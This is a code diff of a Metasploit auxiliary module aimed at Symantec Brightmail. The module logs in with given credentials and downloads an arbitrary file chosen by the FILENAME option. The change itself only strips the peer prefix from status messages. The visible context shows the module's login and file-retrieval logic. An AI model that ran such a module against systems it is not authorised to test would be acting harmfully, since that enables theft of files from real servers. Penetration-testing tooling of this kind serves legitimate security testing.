@@ -111,36 +111,36 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if not res
-      print_error("#{peer} - Unable to download the file. The server timed out.")
+      print_error("Unable to download the file. The server timed out.")
       return
     elsif res and res.body.empty?
-      print_error("#{peer} - File not found or empty.")
+      print_error("File not found or empty.")
       return
     end
 
-    vprint_line("")
+    vprint_line
     vprint_line(res.body)
 
     f = ::File.basename(fname)
     p = store_loot('symantec.brightmail.file', 'application/octet-stream', rhost, res.body, f)
-    print_good("#{peer} - File saved as: '#{p}'")
+    print_good("File saved as: '#{p}'")
   end
 
 
   def run_host(ip)
     sid, last_login = get_login_data
     if sid.empty? or last_login.empty?
-      print_error("#{peer} - Missing required login data.  Cannot continue.")
+      print_error("Missing required login data.  Cannot continue.")
       return
     end
 
     username = datastore['USERNAME']
     password = datastore['PASSWORD']
     if not auth(username, password, sid, last_login)
-      print_error("#{peer} - Unable to login.  Cannot continue.")
+      print_error("Unable to login.  Cannot continue.")
       return
     else
-      print_good("#{peer} - Logged in as '#{username}:#{password}'")
+      print_good("Logged in as '#{username}:#{password}'")
     end
 
     fname = datastore['FILENAME']
